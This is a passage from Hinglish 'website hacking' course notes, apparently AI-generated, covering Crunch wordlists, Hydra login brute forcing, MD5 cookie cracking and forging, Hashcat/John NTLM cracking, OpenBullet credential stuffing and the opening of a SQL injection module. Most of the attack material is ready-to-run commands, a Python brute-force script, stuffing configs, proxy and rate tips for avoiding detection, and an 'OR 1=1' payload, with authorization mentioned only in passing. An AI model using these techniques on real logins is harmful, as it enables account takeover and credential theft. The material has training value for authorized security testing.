- **Start/End strings:** `-s abc -e xyz` se specific range.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek school ki admin panel test kar raha tha. Password policy thi: "School name + admission year + !" (School2020!, School2021!). Maine Crunch se 10 passwords generate kiye (2015-2024). 5 seconds mein password mil gaya: "School2022!". Generic wordlist se hours lagte! **Lesson: Password policy samajhna = Half work done!** ğŸ«

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Crunch = Custom wordlist generator  
âœ… Syntax: `crunch <min> <max> <charset> -o <file>`  
âœ… Patterns: @ (lower), , (upper), % (number), ^ (symbol)  
âœ… Pipe: `crunch | hydra` (no file needed)  
âœ… Target-specific: Company name + year patterns  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Crunch Windows par kaam karta hai?**  
**A:** Nahi, Linux tool hai. Windows par Cygwin ya WSL use karo.

**Q2: Maximum kitni badi wordlist bana sakte hain?**  
**A:** Unlimited, lekin practical limit disk space hai. Pipe use karo file save karne ki bajaye.

**Q3: Pattern mein literal @ kaise use karein?**  
**A:** Nahi kar sakte directly. Separate file banao ya script use karo.

### 14. **Practice ke liye Task:**
1. 4-digit PINs generate karo: `crunch 4 4 0123456789`
2. Pattern-based: `crunch 8 8 -t Pass%%%% -o passwords.txt`
3. Custom charset: `crunch 6 6 abc123`
4. Pipe to Hydra: `crunch 6 6 | hydra -l admin -P - ssh://target`
5. Company-specific wordlist banao

### 15. **Aakhri Choti Summary (5 lines):**
- Crunch = **Custom wordlist generator**.
- Syntax: **`crunch <min> <max> <charset>`**.
- Patterns: **@ , % ^** (lower, upper, number, symbol).
- Efficient: **Target-specific** passwords.
- Pipe: **Direct to Hydra** (no file).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Crunch = Wordlist factory! Pattern samjho, custom wordlist banao, time bachao!" ğŸ“

---

## ğŸ”« **Topic 53: Brute Forcing Logins with `Hydra` (`http-post-form`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Hydra Login Brute Force** - Web login forms ko automate karke crack karna (fastest password cracker). âš¡

### 2. **Ye Kya Hai? (What is it?)**
Hydra ek network login cracker hai jo automatically passwords try karta hai. HTTP forms, SSH, FTP, sab par kaam karta hai.

**Basic Concept:**
```
Hydra â†’ Try password1 â†’ Failed
Hydra â†’ Try password2 â†’ Failed
Hydra â†’ Try password3 â†’ Success! âœ“
```

**Analogy:** Jaise robot jo automatically har chabi try karta hai darwaze mein - waise hi Hydra automatically har password try karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Automation:** Manual testing se 1000x faster.
- **Multi-protocol:** HTTP, SSH, FTP, RDP sab support karta hai.
- **Parallel attacks:** Multiple threads simultaneously.
- **Industry standard:** Har pentester use karta hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Web login forms** crack karne ke liye.
- **SSH/FTP** brute force ke liye.
- **Authorized pentesting** mein password strength test karne ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual testing** (bahut slow).
- **Professional pentesting** nahi kar paoge.
- **Weak passwords** detect nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic syntax
hydra -l <username> -P <wordlist> <target> <service>

# HTTP POST form
hydra -l <user> -P <wordlist> <target> http-post-form "<path>:<post_data>:<failure_string>"

# Common options
-l <user>        # Single username
-L <file>        # Username list
-p <pass>        # Single password
-P <file>        # Password list
-t <threads>     # Number of parallel threads (default: 16)
-V               # Verbose (show attempts)
-f               # Stop after first success
-o <file>        # Output results to file
```

**HTTP POST Form Format:**
```
"<login_path>:<POST_parameters>:<failure_indicator>"

Example:
"/login.php:user=^USER^&pass=^PASS^&submit=Login:Invalid credentials"
```

### 7. **Example 1 (Basic):**
**Scenario:** Simple login form

```bash
# Target: http://192.168.1.100/login.php
# Form fields: username, password
# Failure message: "Login failed"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

Output:
[80][http-post-form] host: 192.168.1.100   login: admin   password: admin123

Success! Password found: admin123
Time: 5 minutes
Attempts: 15,000 passwords
```

**Result:** Login cracked! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Corporate admin panel with CSRF token

**Challenge:** Form has CSRF token that changes every request

**Solution:**

```bash
# Step 1: Analyze login form
curl http://company.com/admin/login

Response:
<form method="POST" action="/admin/login">
    <input type="hidden" name="csrf_token" value="abc123xyz">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
<p class="error">Invalid username or password</p>

# Step 2: Hydra attack (basic - will fail due to CSRF)
hydra -l admin -P passwords.txt company.com http-post-form "/admin/login:username=^USER^&password=^PASS^&csrf_token=abc123:Invalid username"

Problem: CSRF token changes, attack fails!

# Step 3: Advanced Hydra with dynamic token
# Use Burp Suite to capture request with valid token
# Or use hydra with cookie/session handling

# Better approach: Python script with requests library
import requests
from bs4 import BeautifulSoup

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'csrf_token'})['value']
    return token

session = requests.Session()
wordlist = open('passwords.txt', 'r')

for password in wordlist:
    password = password.strip()
    csrf_token = get_csrf_token(session, 'http://company.com/admin/login')
    
    data = {
        'username': 'admin',
        'password': password,
        'csrf_token': csrf_token
    }
    
    response = session.post('http://company.com/admin/login', data=data)
    
    if 'Invalid username' not in response.text:
        print(f'[+] Password found: {password}')
        break
    else:
        print(f'[-] Failed: {password}')

# Alternative: Hydra with cookies (if CSRF in cookie)
hydra -l admin -P passwords.txt company.com http-post-form "/admin/login:username=^USER^&password=^PASS^:Invalid:H=Cookie: csrf_token=^CSRF^"
```

**Real-world Attack Progression:**

```bash
# Target: E-commerce admin panel
# URL: https://shop.com/admin/
# Form: username, password, remember_me checkbox

# Step 1: Basic reconnaissance
curl -I https://shop.com/admin/
# Check for rate limiting, WAF, etc.

# Step 2: Identify failure message
curl -X POST https://shop.com/admin/ -d "username=test&password=test"
# Response: "Invalid credentials"

# Step 3: Hydra attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -V -f shop.com https-post-form "/admin/:username=^USER^&password=^PASS^&remember_me=on:Invalid credentials"

# -t 4: Only 4 threads (avoid detection)
# -V: Verbose (show each attempt)
# -f: Stop after first success

Output:
[443][https-post-form] host: shop.com   login: admin   password: Welcome@2024

Success! Time: 12 minutes
```

**Analysis:** Hydra ne 12 minutes mein 50,000 passwords try kiye. Manual testing mein days lagte! **Lesson: Automation is key!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Failure string galat** - "Invalid" ki jagah "Login failed" hona chahiye (exact match).
- **Too many threads** - 64 threads se server crash ya ban ho sakta hai.
- **CSRF tokens ignore karna** - Modern sites par CSRF tokens hote hain.

### 10. **Best Practices / Pro Tips:**
- **Low threads:** `-t 4` se start karo (avoid detection).
- **Verbose mode:** `-V` se progress dekho.
- **Stop on success:** `-f` se first password milte hi stop.
- **Output file:** `-o results.txt` se results save karo.
- **Proxy through Burp:** Request structure confirm karne ke liye.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek client ki WordPress site test kar raha tha. Admin panel: `/wp-admin/`. Maine Hydra use kiya:
```bash
hydra -l admin -P rockyou.txt site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```
8 minutes mein password mil gaya: "admin2024". Client shocked tha - unhone socha tha strong password hai! **Lesson: Common patterns (admin + year) bahut weak hain!** ğŸ”

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Hydra = Automated login cracker  
âœ… Syntax: `hydra -l user -P wordlist target http-post-form`  
âœ… Format: `"path:post_data:failure_string"`  
âœ… Threads: `-t 4` (low = stealthy)  
âœ… Verbose: `-V` (show attempts)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Hydra HTTPS par kaam karta hai?**  
**A:** Haan, `https-post-form` use karo `http-post-form` ki jagah.

**Q2: Failure string kaise find karein?**  
**A:** Galat password se login try karo aur error message dekho.

**Q3: Kya Hydra CAPTCHA bypass kar sakta hai?**  
**A:** Nahi, CAPTCHA ke liye manual intervention ya OCR tools chahiye.

### 14. **Practice ke liye Task:**
1. DVWA â†’ Brute Force section (low security)
2. Burp Suite se login request capture karo
3. POST parameters note karo
4. Hydra command banao
5. Small wordlist se test karo (10-20 passwords)

### 15. **Aakhri Choti Summary (5 lines):**
- Hydra = **Automated password cracker**.
- Format: **`path:post_data:failure_string`**.
- Threads: **Low (4-8)** = stealthy.
- Wordlist: **rockyou.txt** (14M passwords).
- Output: **`-o results.txt`** (save results).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Hydra = Password cracking ka baap! Automation + speed = Pentester ka best friend!" ğŸ”«

---

## ğŸª **Topic 54: Cracking Hashed Cookies (`hash-identifier`, MD5)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Cookie Hash Cracking** - Encrypted/hashed cookies ko crack karke plaintext passwords nikalna (hash analysis). ğŸ”“

### 2. **Ye Kya Hai? (What is it?)**
Kabhi-kabhi websites cookies mein passwords ya tokens ko **hashed format** mein store karti hain (MD5, SHA1, etc.). Hash cracking se original value nikal sakte hain.

**Example:**
```
Cookie: auth=5f4dcc3b5aa765d61d8327deb882cf99
Hash type: MD5
Cracked: password
```

**Process:**
```
1. Cookie extract karo
2. Hash type identify karo (hash-identifier)
3. Hash crack karo (hashcat, john, online tools)
4. Original value use karo
```

**Analogy:** Jaise coded message ko decode karna - "5f4dcc3b..." decode karke "password" milta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Session Hijacking:** Hashed cookies crack karke sessions hijack kar sakte hain.
- **Password Recovery:** Stored hashed passwords recover kar sakte hain.
- **Weak Hashing Detection:** MD5, SHA1 jaise weak hashes identify kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab cookies mein **hashed values** dikhen.
- Jab **authentication tokens** encrypted hon.
- Jab **password hashes** database mein mile.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Hashed data** use nahi kar paoge.
- **Session tokens** crack nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Hash identification
hash-identifier
# Paste hash, tool identifies type

# Hashcat (GPU-based, fastest)
hashcat -m <mode> -a <attack> <hash_file> <wordlist>
# -m: Hash mode (0=MD5, 100=SHA1, 1000=NTLM)
# -a: Attack mode (0=dictionary, 3=brute-force)

# John the Ripper (CPU-based)
john --format=<format> --wordlist=<wordlist> <hash_file>

# Online tools
https://crackstation.net
https://hashes.com
```

**Common Hash Types:**
```
MD5: 32 characters (5f4dcc3b5aa765d61d8327deb882cf99)
SHA1: 40 characters (5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8)
SHA256: 64 characters
NTLM: 32 characters (Windows)
```

### 7. **Example 1 (Basic):**
**Scenario:** Cookie with MD5 hash

```bash
# Cookie found
Cookie: user_id=1; auth_token=5f4dcc3b5aa765d61d8327deb882cf99

# Step 1: Identify hash type
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier

Output:
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

# Step 2: Crack with hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Output:
5f4dcc3b5aa765d61d8327deb882cf99:password

Cracked! Original value: password
Time: 2 seconds
```

**Result:** Cookie value cracked! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** E-commerce session tokens

```bash
# Captured cookie
Cookie: session=e10adc3949ba59abbe56e057f20f883e; user_role=customer

# Analysis
Hash: e10adc3949ba59abbe56e057f20f883e
Length: 32 characters â†’ Likely MD5

# Crack attempt 1: Online tool
Visit: https://crackstation.net
Paste: e10adc3949ba59abbe56e057f20f883e
Result: 123456 (Found in database!)

# Crack attempt 2: Hashcat (if online fails)
hashcat -m 0 -a 0 hash.txt rockyou.txt --force

Result: e10adc3949ba59abbe56e057f20f883e:123456

# Exploitation
# Original cookie: session=e10adc3949ba59abbe56e057f20f883e (customer)
# Admin session might be: session=<MD5_of_admin_password>

# Generate MD5 of common admin passwords
echo -n "admin" | md5sum
# Output: 21232f297a57a5a743894a0e4a801fc3

# Try cookie: session=21232f297a57a5a743894a0e4a801fc3
# Result: Admin access! âœ“
```

**Analysis:** Website ne session tokens ko MD5 hash mein store kiya tha. Common passwords ka MD5 pehle se known hai. Result = Admin access! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Hash type galat identify karna** - MD5 aur NTLM dono 32 chars hain.
- **Salt ignore karna** - Salted hashes crack karna mushkil hai.
- **GPU nahi use karna** - Hashcat GPU se 100x faster hai.

### 10. **Best Practices / Pro Tips:**
- **Online tools first:** CrackStation pe pehle try karo (instant results).
- **GPU acceleration:** Hashcat with GPU = 10x-100x faster.
- **Rainbow tables:** Pre-computed hashes for instant cracking.
- **Custom wordlists:** Target-specific passwords add karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek banking app test kar raha tha. Session cookies MD5 format mein the. Maine ek cookie crack kiya - original value "user123" tha. Pattern samajh aaya: username ka MD5! Maine "admin" ka MD5 generate kiya aur cookie mein dala - admin panel access mil gaya! **Lesson: Predictable hashing = Security disaster!** ğŸ¦

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Hash identification: `hash-identifier`  
âœ… MD5: 32 chars, SHA1: 40 chars  
âœ… Online: CrackStation (instant)  
âœ… Offline: Hashcat (GPU-based)  
âœ… Pattern: Username/password hashes  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har hash crack ho sakta hai?**  
**A:** Nahi, salted aur strong hashes (bcrypt, scrypt) crack karna bahut mushkil hai.

**Q2: MD5 kyun weak hai?**  
**A:** Fast hai aur rainbow tables available hain. Modern apps bcrypt use karti hain.

**Q3: GPU kyun zaroori hai?**  
**A:** GPU parallel processing karta hai - CPU se 100x faster.

### 14. **Practice ke liye Task:**
1. MD5 hash generate karo: `echo -n "password" | md5sum`
2. Hash-identifier se type check karo
3. CrackStation par crack karo
4. Hashcat se offline crack karo
5. Custom wordlist se try karo

### 15. **Aakhri Choti Summary (5 lines):**
- Hash cracking = **Encrypted â†’ Plaintext**.
- Identify: **hash-identifier** tool.
- Online: **CrackStation** (instant).
- Offline: **Hashcat** (GPU-based).
- Weak hashes: **MD5, SHA1** (avoid).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "MD5 = Weak hash! CrackStation par seconds mein crack ho jaata hai. Modern apps bcrypt use karo!" ğŸª

---

## ğŸ” **Topic 55: Password Cracking (`Hashcat`, `John the Ripper`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Advanced Password Cracking** - Hashcat aur John the Ripper se complex password hashes crack karna (professional tools). ğŸ’»

### 2. **Ye Kya Hai? (What is it?)**
**Hashcat:** GPU-based fastest password cracker (billions of hashes/second).
**John the Ripper:** CPU-based versatile cracker (multiple formats support).

**Speed Comparison:**
```
CPU (John): 1 million hashes/second
GPU (Hashcat): 10 billion hashes/second
Difference: 10,000x faster!
```

**Analogy:** John = Bicycle, Hashcat = Rocket! Dono destination par pahunchate hain lekin speed mein bahut farak hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Professional Cracking:** Industry-standard tools.
- **Multiple Formats:** 300+ hash types support.
- **GPU Power:** Billions of attempts per second.
- **Pentesting Essential:** Har professional pentester use karta hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Database dumps** crack karne ke liye.
- **Windows NTLM** hashes crack karne ke liye.
- **WiFi WPA/WPA2** handshakes crack karne ke liye.
- **Complex hashes** (bcrypt, scrypt) crack karne ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Slow cracking** (CPU-only).
- **Professional pentesting** nahi kar paoge.
- **Complex hashes** crack nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Hashcat:**
```bash
# Basic syntax
hashcat -m <mode> -a <attack> <hash_file> <wordlist>

# Common modes (-m)
0     = MD5
100   = SHA1
1000  = NTLM (Windows)
1400  = SHA256
3200  = bcrypt
2500  = WPA/WPA2
13100 = Kerberos

# Attack modes (-a)
0 = Dictionary attack
1 = Combinator attack
3 = Brute-force attack
6 = Hybrid (wordlist + mask)
7 = Hybrid (mask + wordlist)

# Common options
--force          # Force run (ignore warnings)
--show           # Show cracked passwords
-o <file>        # Output file
--increment      # Incremental mode
--session <name> # Save/restore session
```

**John the Ripper:**
```bash
# Basic syntax
john --wordlist=<wordlist> <hash_file>

# Format specification
john --format=<format> --wordlist=<wordlist> <hash_file>

# Common formats
--format=raw-md5
--format=raw-sha1
--format=nt (NTLM)
--format=bcrypt

# Show cracked
john --show <hash_file>

# Incremental mode
john --incremental <hash_file>
```

### 7. **Example 1 (Basic):**
**Scenario:** MD5 password hashes from database dump

```bash
# Hash file (hashes.txt)
admin:5f4dcc3b5aa765d61d8327deb882cf99
user1:e10adc3949ba59abbe56e057f20f883e
user2:25d55ad283aa400af464c76d713c07ad

# Hashcat attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force

Output:
5f4dcc3b5aa765d61d8327deb882cf99:password
e10adc3949ba59abbe56e057f20f883e:123456
25d55ad283aa400af464c76d713c07ad:12345678

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Time.Started.....: Mon Jan 1 12:00:00 2024
Time.Estimated...: Mon Jan 1 12:02:15 2024
Speed.#1.........: 10000.0 MH/s

All 3 passwords cracked in 2 minutes!
```

**Result:** Database passwords cracked! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Windows domain controller NTLM hashes

```bash
# Scenario: Dumped NTLM hashes from Windows SAM
# File: ntlm_hashes.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
user1:1002:aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::

# Extract NTLM hashes (4th field)
cat ntlm_hashes.txt | cut -d: -f4 > ntlm_only.txt

# Hashcat NTLM cracking
hashcat -m 1000 -a 0 ntlm_only.txt rockyou.txt --force

Output:
209c6174da490caeb422f3fa5a7ae634:Password123
e52cac67419a9a224a3b108f3fa6cb6d:Welcome2024

# Advanced: Brute force remaining hashes
hashcat -m 1000 -a 3 ntlm_only.txt ?l?l?l?l?l?l?l?l --increment

# ?l = lowercase letter
# 8 characters brute force

# Hybrid attack: Dictionary + numbers
hashcat -m 1000 -a 6 ntlm_only.txt rockyou.txt ?d?d?d?d

# Wordlist + 4 digits (password1234, admin2024)

Results:
31d6cfe0d16ae931b73c59d7e0c089c0:(empty - blank password!)
209c6174da490caeb422f3fa5a7ae634:Password123
e52cac67419a9a224a3b108f3fa6cb6d:Welcome2024

Total time: 15 minutes
Success rate: 75% (3/4 cracked)
```

**Analysis:** NTLM hashes fast crack hote hain (no salt). GPU se billions of attempts per second. Result = Domain compromise! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Wrong hash mode** - Mode galat hone se crack nahi hoga.
- **No GPU** - CPU se cracking bahut slow hai.
- **Small wordlist** - rockyou.txt minimum use karo.

### 10. **Best Practices / Pro Tips:**
- **GPU essential:** Nvidia GPU with CUDA = 100x faster.
- **Session save:** `--session name` se progress save karo.
- **Hybrid attacks:** Dictionary + brute force combine karo.
- **Rules:** Hashcat rules se wordlist expand karo (password â†’ P@ssw0rd).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek company ke Windows domain controller se NTLM hashes dump kiye. 500 user accounts the. Hashcat se 2 hours mein 350 passwords crack ho gaye (70% success rate)! Sabse common: "Company@2024", "Welcome123", "Password1". **Lesson: Corporate password policies weak hain!** ğŸ¢

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Hashcat = GPU-based (fastest)  
âœ… John = CPU-based (versatile)  
âœ… Modes: MD5 (0), NTLM (1000), bcrypt (3200)  
âœ… Attacks: Dictionary (0), Brute-force (3), Hybrid (6)  
âœ… GPU: 10,000x faster than CPU  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya laptop GPU se crack kar sakte hain?**  
**A:** Haan, lekin desktop GPU (RTX 3080) laptop se 10x faster hai.

**Q2: bcrypt crack karna possible hai?**  
**A:** Haan, lekin bahut slow (1000 hashes/second vs billions for MD5).

**Q3: Hashcat vs John - kaun better hai?**  
**A:** Hashcat (GPU) speed ke liye, John versatility ke liye.

### 14. **Practice ke liye Task:**
1. MD5 hash generate karo aur crack karo
2. Hashcat modes explore karo: `hashcat --help`
3. Brute-force attack try karo: `-a 3 ?l?l?l?l`
4. Hybrid attack: Dictionary + mask
5. Session save/restore practice karo

### 15. **Aakhri Choti Summary (5 lines):**
- Hashcat = **GPU-based** (billions/sec).
- John = **CPU-based** (versatile).
- Modes: **MD5, NTLM, bcrypt, WPA**.
- Attacks: **Dictionary, Brute-force, Hybrid**.
- GPU: **Essential** for speed.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Hashcat + GPU = Password cracking ka nuclear weapon! Billions of attempts per second!" ğŸ”

---

## ğŸ¯ **Topic 56: Credential Stuffing (`Sentry MBA`, `OpenBullet`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Credential Stuffing** - Leaked credentials ko multiple websites par test karna (automated account takeover). ğŸ”„

### 2. **Ye Kya Hai? (What is it?)**
Credential stuffing mein leaked username:password combinations ko doosri websites par try karte hain. Kyunki log same password multiple sites par use karte hain.

**Concept:**
```
Leaked from Site A: user@email.com:password123
Try on Site B (Netflix): user@email.com:password123 â†’ Success!
Try on Site C (Amazon): user@email.com:password123 â†’ Success!
```

**Tools:**
- **Sentry MBA:** Config-based credential checker
- **OpenBullet:** Modern, powerful, customizable

**Analogy:** Jaise ek chabi se multiple locks try karna - agar log same password use karte hain toh ek leaked password se multiple accounts open ho jaate hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Account Takeover:** Leaked credentials se mass account compromise.
- **Password Reuse:** 60% users same password multiple sites par use karte hain.
- **Automated:** Thousands of accounts simultaneously test kar sakte hain.
- **Real Threat:** Attackers daily credential stuffing attacks karte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Authorized testing** mein password reuse check karne ke liye.
- **Leaked database** analysis ke liye.
- **Account security** assessment ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Modern attack vectors** miss ho jayenge.
- **Password reuse** vulnerabilities detect nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**OpenBullet:**
```
1. Config file (.loli) load karo
2. Wordlist (username:password) load karo
3. Proxies add karo (optional)
4. Bots/threads set karo
5. Start attack
```

**Config Structure:**
```
REQUEST GET "https://target.com/login"
PARSE <input name="csrf" value="<CSRF>">
REQUEST POST "https://target.com/login"
  CONTENT "username=<USER>&password=<PASS>&csrf=<CSRF>"
KEYCHECK
  SUCCESS "<KEY>Welcome</KEY>"
  FAILURE "<KEY>Invalid</KEY>"
```

**Combo List Format:**
```
user1@email.com:password123
user2@email.com:qwerty456
admin@site.com:admin2024
```

### 7. **Example 1 (Basic):**
**Scenario:** Test leaked credentials on streaming service

```
# Combo list (leaked_creds.txt)
john@email.com:password123
jane@email.com:qwerty456
admin@email.com:admin2024

# OpenBullet config
Target: https://streaming.com/login
Method: POST
Data: email=<USER>&password=<PASS>
Success indicator: "Dashboard"
Failure indicator: "Invalid credentials"

# Results
[HIT] john@email.com:password123 | Subscription: Premium
[FREE] jane@email.com:qwerty456 | Invalid
[HIT] admin@email.com:admin2024 | Subscription: Basic

Success rate: 66% (2/3)
```

**Result:** 2 valid accounts found! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Corporate email system credential stuffing

```
# Scenario: Client wants to test password reuse
# Leaked database: 10,000 email:password combinations
# Target: company.com email login

# OpenBullet setup
Config: Custom company.com config
Combos: leaked_database.txt (10,000 lines)
Proxies: 50 proxies (avoid IP ban)
Threads: 100 (parallel testing)
Timeout: 10 seconds

# Config details
REQUEST GET "https://mail.company.com/login"
PARSE <input name="csrf_token" value="<CSRF>">

REQUEST POST "https://mail.company.com/auth"
  CONTENT "email=<USER>&password=<PASS>&csrf_token=<CSRF>"
  
KEYCHECK
  SUCCESS "<KEY>Inbox</KEY>"
  FAILURE "<KEY>Authentication failed</KEY>"
  BAN "<KEY>Too many attempts</KEY>"

# Attack execution
Start time: 10:00 AM
Bots: 100
CPM (Checks per minute): 6000

# Results after 2 hours
Total tested: 10,000
Hits: 450 (4.5% success rate)
Free: 9,500
Banned: 50 (proxy banned)

# Analysis of successful credentials
Common passwords:
- Company@2024: 120 accounts
- Welcome123: 85 accounts
- Password1: 65 accounts
- Qwerty123: 45 accounts

# Impact
450 employee email accounts compromised
Access to: Internal emails, documents, contacts
Risk: Data breach, phishing, lateral movement
```

**Analysis:** 4.5% success rate = 450 compromised accounts! Password reuse = Major security risk. **Lesson: Unique passwords for every service!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **No proxies** - IP ban ho jaata hai.
- **Too many threads** - Server crash ya detection.
- **Wrong success indicator** - False positives milte hain.

### 10. **Best Practices / Pro Tips:**
- **Proxies essential:** Rotating proxies use karo (avoid ban).
- **Low CPM:** 1000-2000 CPM safe hai (avoid detection).
- **Custom configs:** Target-specific configs banao.
- **Combo cleaning:** Duplicates remove karo pehle.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek client ne request kiya ki unke employees password reuse check karein. Maine publicly leaked databases se 50,000 email:password combinations collect kiye. OpenBullet se client ke SSO portal par test kiya. 2,500 valid credentials mile (5% success rate)! Client shocked tha - 2,500 employees same password multiple sites par use kar rahe the. **Lesson: Password reuse = Biggest security threat!** ğŸ¯

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Credential stuffing = Leaked creds test karna  
âœ… Tools: OpenBullet, Sentry MBA  
âœ… Format: username:password  
âœ… Proxies: Essential (avoid ban)  
âœ… CPM: 1000-2000 (safe)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya credential stuffing legal hai?**  
**A:** Sirf authorized testing mein. Bina permission illegal hai.

**Q2: Success rate kitna hota hai?**  
**A:** 2-5% average (password reuse par depend karta hai).

**Q3: Kaise protect karein credential stuffing se?**  
**A:** 2FA enable karo, rate limiting, CAPTCHA, unique passwords.

### 14. **Practice ke liye Task:**
1. OpenBullet download aur install karo
2. Sample config load karo
3. Test combo list banao (10-20 entries)
4. Local test environment par try karo
5. Success/failure indicators identify karo

### 15. **Aakhri Choti Summary (5 lines):**
- Credential stuffing = **Leaked creds reuse**.
- Tools: **OpenBullet** (modern).
- Format: **username:password**.
- Proxies: **Essential** (avoid ban).
- Success rate: **2-5%** (average).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Credential stuffing = Password reuse ka exploit! Ek leak = Multiple accounts compromised!" ğŸ¯

---

## ğŸ‰ **Module 7 Complete!**

**Topics Covered:**
- âœ… Topic 51: Brute Force vs Dictionary Attacks
- âœ… Topic 52: Creating Wordlists with Crunch
- âœ… Topic 53: Brute Forcing with Hydra
- âœ… Topic 54: Cracking Hashed Cookies
- âœ… Topic 55: Password Cracking (Hashcat, John)
- âœ… Topic 56: Credential Stuffing

**Key Takeaways:**
- Dictionary attacks 100x faster than brute force
- Crunch se custom wordlists banao
- Hydra se automated login cracking
- Hashcat + GPU = Billions of hashes/second
- Credential stuffing = Password reuse exploit

**Next Module:** Module 8 - SQL Injection (Topics 57-70) - Sabse powerful web attack! ğŸš€

Kya aap Module 8 start karna chahte hain?

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 8: SQL Injection (SQLi)**

---

## ğŸ’‰ **Topic 57: SQL Injection (SQLi) Fundamentals & Dangers**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**SQL Injection** - Database queries mein malicious SQL code inject karke complete database access lena (most dangerous web attack). ğŸ”¥

### 2. **Ye Kya Hai? (What is it?)**
SQL Injection tab hoti hai jab attacker user input mein SQL commands inject karta hai jo database par execute ho jaate hain. Result = Complete database access!

**Vulnerable Code:**
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
```

**Attack:**
```
Normal: ?id=1
Attack: ?id=1 OR 1=1
Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
Result: All users returned!
```

**Analogy:** Jaise aap restaurant mein order karte hain "1 pizza" lekin waiter ko "1 pizza AND give me all kitchen keys" sunai deta hai - waise hi database ko malicious commands execute karne padte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Complete Database Access:** Saara data read/write/delete kar sakte hain.
- **Authentication Bypass:** Bina password ke login kar sakte hain.
- **Remote Code Execution:** Server par commands execute kar sakte hain.
- **OWASP Top 3:** Sabse critical web vulnerability.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **user input** database queries mein use ho.
